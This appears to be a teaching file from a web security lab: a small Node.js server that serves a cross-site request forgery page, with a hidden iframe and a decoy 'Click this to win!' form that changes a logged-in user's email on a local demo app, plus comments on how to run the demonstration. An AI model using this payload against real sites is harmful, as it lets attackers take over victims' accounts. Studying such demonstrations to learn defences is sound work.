const http = require("http");

const attackerEmail = "attacker@example.com";

const server = http.createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/html" });
    res.end(`
    <iframe name=hide style="position:absolute;left:-1000px"></iframe>
    <form method="post" action="http://localhost:3000/update" target="hide">
    <input type="hidden" name="email" value="${attackerEmail}">
    <input type="submit" value="Click this to win!">
    </form>`);
});

server.listen(3001, () => {
    console.log("Server listening on port 3001");
});

// This provides us with an example of a cross-site request forgery attack.
// In this example a basic server with a username and email field is set up to accept login credentials.
// Once logged in, the email is displayed on a /update page.

// But if an attacker wished to maliciously change the credentials remotely, he could set up something like above, which tricks the user to into clicking a button/link
// which updates the /update page and changes the email

// To demonstrate this, simply run node server.js in one terminal and node csrf-server.js in another, then navigate to both localhost:3000 and localhost:3001
// On the page brought up by localhost:3000, enter the credentials "beth" and "badpassword" to bring you to the email page, there enter the email "beth@example.com"
// This should bring you to othe standard page that displays the email above the submit field, both with the text "beth@example.com"

// Now from the page brought up by the localhost:3001, click on the button, and then refresh the page on localhost:3000/update... it should now show the email displayed as 
// "attacker@eample.com"
// This demonstrates how a maicious hacker could change credentials remotely by tricking the user into clicking on a button or link...

// This is fixed by modifying the server.js file to mitigate the attack.